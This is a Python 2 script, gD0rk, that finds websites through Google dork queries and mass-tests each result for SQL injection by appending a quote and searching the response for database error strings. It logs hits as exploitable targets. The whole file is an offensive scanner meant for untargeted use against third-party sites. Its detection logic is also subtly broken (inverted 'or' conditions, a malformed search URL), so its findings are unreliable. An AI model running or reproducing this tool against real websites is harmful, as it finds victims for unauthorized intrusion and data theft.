#!/usr/bin/python2
# gD0rk!
# This code is Licenced under GPL 2
# Developer: TheV0iD
# Feel Free to commit!
# Limited to 1000 Searches/Day

import urllib
import urllib2
import sys
import json
import os

dork_type = sys.argv[1]			# Application MODE
dork_keyword = sys.argv[2]		# Dork Query
dork_pagemax = int(sys.argv[3])		# Pages you want to scan
arq = open("logfile.txt", "w")		# Log FIle
os.system("clear")

#---------------------------------------------------------------------#
#	Simple Dork Function

def dork ():
	print "gD0rk --- Google Dorking && Mass Scanner \nDeveloped By 'TheV0iD' for WebSecHub \nGithub: http://github.com/Th3V0iD/WebSecHub/"
	print "Dorking for keyword.. '" + dork_keyword + "', showing first "+sys.argv[3]+" results."
	search_url = "http://ajax.googleapis.com/ajax/services/search/web?v=2.0&q="+dork_keyword #Dork Search URL
	page = 0
	while (page < dork_pagemax):								#Stop when reach max results
		current_url = search_url + '?cod=&start=' + str(page)				# Scan one by one
		json_src = json.load(urllib.urlopen(current_url))				# Json receiving data
		results = json_src['responseData']['results']
		for result in results:								# Testing URLS
			website_url = urllib.unquote(result['url'])
			print "\t -->   " + website_url
			arq.write("---->     " + website_url)
			page = page + 1

#---------------------------------------------------------------------#
# 	Massive SQLi scanner exploring dorks

def sqlitest_dork ():
	print "gD0rk --- Google Dorking && Mass Scanner Tool \nDeveloped By 'TheV0iD' for WebSecHub \nGithub: http://github.com/Th3V0iD/WebSecHub/"
	print "Dorking for keyword.. '" + dork_keyword + "', showing first "+sys.argv[3]+" results."
	search_url = "http://ajax.googleapis.com/ajax/services/search/web?v=2.0&q="+dork_keyword # Dork search url
	page = 0
	while (page < dork_pagemax): 								#Stop when reach max results
		current_url = search_url + '?cod=&start=' + str(page)				#Scan one by one
		json_src = json.load(urllib.urlopen(current_url))				# Json receiving  data
		results = json_src['responseData']['results']	
		for result in results:								# Printing URLs and manipulating em
			try:
				website_url = urllib.unquote(result['url'])
				print "\t -->   Testing:   " + website_url
				sqlitest_url = website_url + "'"
				content = urllib2.urlopen(sqlitest_url).read()						# Testing them with > ' <
				if (content.find("error in your SQL syntax") == -1) or (content.find("ODBC SQL Server Driver") == -1) or (content.find("SQL syntax error") == -1) or (content.find("mysql_num_rows") == -1) or (content.find("ASP.NET_SessionId") == -1) or (content.find("Fatal error") == -1) or (content.find("Incorrect syntax near") == -1) or (content.find("Internal Server Error") == -1) or (content.find("PostgreSQL query failed") == -1) or (content.find("Syntax error in query expression") == -1) or (content.find("Division by zero in") == -1) or (content.find("invalid query") == -1) or (content.find("MYSQL error") == -1) or (content.find("mysql_fetch_array") == -1):
					print ("Exploit not Found") 							# If there arent any error, exploit not found
				else:
					print ("Exploit Found")								# Else, exploit found
					arq.write("---->     " + website_url)
					arq.write("\n")
				page = page + 1
			except:
				print "Done Scanning"
				exit()
			

def help ():
	print "gD0rk --- Google Dorking && Mass Scanner \nDeveloped By 'TheV0iD' for WebSecHub \nGithub: http://github.com/Th3V0iD/WebSecHub/"
	print
	print "Commands:"
	print "\t > '-h' or '--help' show this help info"
	print "\t > '-d' or '--dork' simple dork"
	print "\t > '-s' or '--sqli' mass scan with all dork results"
	print
	print 'Use:	./gD0rk [-d/-s/-h] ["Your dork"] [How Much Results you want'
	print "Examples:"
	print '\t > ./gD0rk -d "allinurl:.php?cat=" 100'
	print '\t > ./gD0rk -s "allinurl:.php?id=" 100'
	print
	print "Thank you for using!"
	print "http://www.github.com/Th3V0iD/WebSecHub"

#---------------------------------------------------------------------#

if (dork_type == "-d") or (dork_type ==  "--dork"):
	dork()
elif (dork_type == "-s") or (dork_type == "--sqli"):
	sqlitest_dork()
elif (dork_type == "-h") or (dork_type ==  "--help"):
	help()
else:
	print "Invalid Parameter, to see gDork parameters please use '-h' or '--help'."
	
